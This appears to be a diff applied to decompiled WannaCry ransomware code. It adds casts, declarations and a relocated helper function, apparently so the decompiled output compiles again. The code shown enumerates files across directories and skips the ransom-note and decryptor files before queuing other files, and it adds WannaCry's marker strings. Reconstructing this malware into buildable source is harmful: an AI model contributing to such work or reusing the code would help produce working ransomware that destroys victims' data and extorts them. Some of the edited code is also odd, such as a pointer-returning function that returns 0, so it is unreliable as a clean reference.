@@ -3114,7 +3114,7 @@ LAB_1000229a:
   return 1;
 }
 
-int FUN_10003730(undefined4 *param_1,int param_2)
+undefined4 *FUN_10003730(undefined4 *param_1,int param_2)
 
 {
   undefined4 *puVar1;
@@ -3126,13 +3126,15 @@ int FUN_10003730(undefined4 *param_1,int param_2)
   *puVar1 = (undefined4)param_1;
   if (param_2 != 0) {
     puVar1[1] = param_2;
-    return;
+    return 0;
   }
   puVar1[1] = (undefined4)puVar1;
   return puVar1;
 }
 
 wchar_t u__Please_Read_Me__txt_1000cc74[] = L"@Please_Read_Me@.txt";
+wchar_t u__WanaDecryptor__exe_lnk_1000cc44[] = L"@WanaDecryptor@.exe.lnk";
+wchar_t u__WanaDecryptor__bmp_1000cc1c[] = L"@WanaDecryptor@.bmp";
 
 undefined4 __thiscall
 FUN_10002300(void *pThis,LPCWSTR param_1,void *param_2,uint param_3,int param_4)
@@ -3146,7 +3148,7 @@ FUN_10002300(void *pThis,LPCWSTR param_1,void *param_2,uint param_3,int param_4)
   HANDLE hFindFile;
   undefined4 uVar6;
   int iVar7;
-  undefined3 extraout_var;
+  unsigned int extraout_var;
   size_t sVar8;
   BOOL BVar9;
   code *pcVar10;
@@ -3219,7 +3221,7 @@ FUN_10002300(void *pThis,LPCWSTR param_1,void *param_2,uint param_3,int param_4)
               (iVar7 = wcscmp(local_a10.cFileName,u__WanaDecryptor__exe_lnk_1000cc44), iVar7 != 0))
              && (iVar7 = wcscmp(local_a10.cFileName,u__WanaDecryptor__bmp_1000cc1c), iVar7 != 0)) {
             local_4f0 = L'\0';
-            puVar13 = local_4ee;
+            puVar13 = (undefined4*)local_4ee;
             for (iVar7 = 0x138; iVar7 != 0; iVar7 = iVar7 + -1) {
               *puVar13 = 0;
               puVar13 = puVar13 + 1;
@@ -3233,20 +3235,20 @@ FUN_10002300(void *pThis,LPCWSTR param_1,void *param_2,uint param_3,int param_4)
               wcsncpy(&local_4f0,local_7c0,0x167);
               local_14 = local_a10.nFileSizeHigh;
               local_18 = local_a10.nFileSizeLow;
-              FUN_10003760(local_a40,&local_a30,local_a3c,(undefined4 *)&local_4f0);
+              FUN_10003760(local_a40,(undefined4*)&local_a30,local_a3c,(undefined4 *)&local_4f0);
             }
           }
         }
         else {
           bVar5 = FUN_100032c0(local_7c0,local_a10.cFileName);
           if (CONCAT31(extraout_var,bVar5) == 0) {
-            std::basic_string<>::_Tidy(local_a24,false);
+            //std::basic_string<wchar_t>::assign(local_a24, false);
             sVar8 = wcslen(local_7c0);
-            std::basic_string<>::assign(local_a24,(ushort *)local_7c0,sVar8);
-            local_4._0_1_ = 2;
-            FUN_100035c0(local_a4c,&local_a14,local_a48,local_a24);
-            local_4._0_1_ = 1;
-            std::basic_string<>::_Tidy(local_a24,true);
+            ((std::wstring *)&local_a24)->assign((wchar_t *)local_7c0, sVar8);
+            ((unsigned char *)&local_4)[0] = 2;
+            FUN_100035c0(local_a4c,(undefined4*)&local_a14,local_a48,local_a24);
+            ((unsigned char *)&local_4)[0] = 1;
+            //std::basic_string<>::_Tidy(local_a24,true);
           }
         }
       }
@@ -3259,7 +3261,7 @@ FUN_10002300(void *pThis,LPCWSTR param_1,void *param_2,uint param_3,int param_4)
       do {
         iVar7 = FUN_10002940(pThis,(wchar_t *)(piVar12 + 2),1);
         if (iVar7 == 0) {
-          FUN_10003760(param_2,&local_a30,*(void **)((int)param_2 + 4),piVar12 + 2);
+          FUN_10003760(param_2,(undefined4*)&local_a30,*(void **)((int)param_2 + 4),(undefined4*)piVar12 + 2);
         }
         piVar12 = (int *)*piVar12;
       } while (piVar12 != local_a3c);
@@ -3301,7 +3303,7 @@ FUN_10002300(void *pThis,LPCWSTR param_1,void *param_2,uint param_3,int param_4)
       } while (piVar12 != local_a48);
     }
     piVar4 = local_a48;
-    local_4 = (HANDLE)((uint)local_4._1_3_ << 8);
+    local_4 = (HANDLE)(((unsigned int)((unsigned char *)&local_4)[1]) << 8);
     piVar12 = (int *)*local_a48;
     while (piVar12 != piVar4) {
       piVar3 = (int *)*piVar12;
@@ -3329,6 +3331,16 @@ FUN_10002300(void *pThis,LPCWSTR param_1,void *param_2,uint param_3,int param_4)
 }
 
 
+void __thiscall FUN_100035b0(void *pThis, undefined4 **param_1)
+
+{
+  undefined4 *puVar1;
+  
+  puVar1 = *(undefined4 **)pThis;
+  *(undefined4 *)pThis = *puVar1;
+  *param_1 = (undefined4*)puVar1;
+  return;
+}
 
 undefined4 __thiscall FUN_100027f0(void *pThis,LPCWSTR param_1,int *param_2)
 
@@ -3347,11 +3359,11 @@ undefined4 __thiscall FUN_100027f0(void *pThis,LPCWSTR param_1,int *param_2)
   undefined4 local_4;
   
   local_4 = 0xffffffff;
-  puStack_8 = &LAB_10006e38;
+  puStack_8 = (unsigned int*)&LAB_10006e38;
   local_c = ExceptionList;
-  local_18[0] = param_2._0_1_;
+  local_18[0] = (unsigned char)param_2;
   ExceptionList = &local_c;
-  local_14 = operator_new(0x4ec);
+  local_14 = (int *)operator_new(0x4ec);
   *local_14 = (int)local_14;
   local_14[1] = (int)local_14;
   local_10 = 0;
@@ -3386,18 +3398,18 @@ undefined4 __thiscall FUN_100027f0(void *pThis,LPCWSTR param_1,int *param_2)
       piVar6 = local_14;
       local_4 = 0xffffffff;
       piVar3 = (int *)*local_14;
-      piVar5 = param_2;
-      while (param_2 = piVar3, param_2 != piVar6) {
+      piVar5 = (int*)param_2;
+      while (param_2 = (int*)piVar3, param_2 != piVar6) {
         piVar3 = (int *)*param_2;
-        puVar2 = (undefined4 *)FUN_100035b0(&param_2,&param_1);
+        FUN_100035b0(&param_2, &puVar2);
         piVar5 = (int *)*puVar2;
         *(int *)piVar5[1] = *piVar5;
         *(int *)(*piVar5 + 4) = piVar5[1];
         operator_delete(piVar5);
         local_10 = local_10 + -1;
-        piVar5 = param_2;
+        piVar5 = (int*)param_2;
       }
-      param_2 = piVar5;
+      param_2 = (int*)piVar5;
       operator_delete(local_14);
       ExceptionList = local_c;
       return 1;
@@ -3405,7 +3417,7 @@ undefined4 __thiscall FUN_100027f0(void *pThis,LPCWSTR param_1,int *param_2)
   } while( true );
 }
 
-
+wchar_t u__WNCYR_1000cc04[] = L".WNCYR";
 
 undefined4 __thiscall FUN_10002940(void *pThis,wchar_t *param_1,uint param_2)
 
@@ -3438,7 +3450,10 @@ undefined4 __thiscall FUN_10002940(void *pThis,wchar_t *param_1,uint param_2)
   return 0;
 }
 
-
+wchar_t u__WNCRYT_1000cbc8[] = L".WNCRYT";
+extern "C" void* _C_exref;
+FARPROC DAT_1000d92c = nullptr;
+extern "C" int (*DAT_1000d930)(const wchar_t *);
 
 void __fastcall FUN_100029f0(int param_1)
 
@@ -3466,7 +3481,7 @@ void __fastcall FUN_100029f0(int param_1)
       _Str = (wchar_t *)(param_1 + 0x70c);
       do {
         pcVar2 = *(code **)(**(int **)(param_1 + 0x4e4) + 0xc);
-        lpFileName = _C_exref;
+lpFileName = reinterpret_cast<code *>(_C_exref);
         if (pcVar2 != (code *)0x0) {
           lpFileName = pcVar2;
         }
@@ -4083,20 +4098,6 @@ void __fastcall FUN_10003560(int param_1)
   *(undefined4 *)(param_1 + 8) = 0;
   return;
 }
-
-
-
-void __thiscall FUN_100035b0(void *pThis,undefined4 *param_1)
-
-{
-  undefined4 *puVar1;
-  
-  puVar1 = *(undefined4 **)pThis;
-  *(undefined4 *)pThis = *puVar1;
-  *param_1 = puVar1;
-  return;
-}
-
 
 
 void __thiscall FUN_100035c0(void *pThis,undefined4 *param_1,void *param_2,basic_string<> *param_3)
